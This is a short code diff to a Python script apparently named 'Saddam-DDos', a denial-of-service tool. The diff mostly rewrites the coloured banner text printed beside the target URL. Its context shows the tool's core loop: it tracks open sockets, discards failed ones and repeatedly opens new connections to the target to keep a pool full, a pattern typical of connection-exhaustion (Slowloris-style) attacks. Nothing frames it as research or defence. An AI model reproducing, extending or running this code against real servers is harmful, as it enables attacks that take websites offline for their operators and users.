@@ -124,8 +124,8 @@ def main():
     bar.finish()
 
     while True:
-        print("\033[32m[]".format(len(socket_list)))
-        print("\033[95m[]
+        print("\033[32m[]└> ".format(len(socket_list)))
+        print("\033[95m[]└> \033[33mSaddam-DDos \033[3m••> \033[38;5;206m" +str(url)+ "   |\033[0m")
 
         for s in socket_list:
             try:
@@ -134,7 +134,8 @@ def main():
                 socket_list.remove(s)
 
         for _ in range(socket_count - len(socket_list)):
-            print(("\033[33m   {}:::\033[37m▒▒\033[33m▒▒CONNECT\033[96m▒▒THE\033[97m▒▒WEBS\033[31m▒▒\033[96m▒▒\033[35m::".format("\n")))
+            print("\033[32m[]└> ".format(len(socket_list)))
+            print("\033[95m[]└> \033[33mSaddam-DDos \033[3m••> \033[38;5;206m" +str(url)+ "   |\033[0m")
             try:
                 s=init_socket(ip,port)
                 if s:
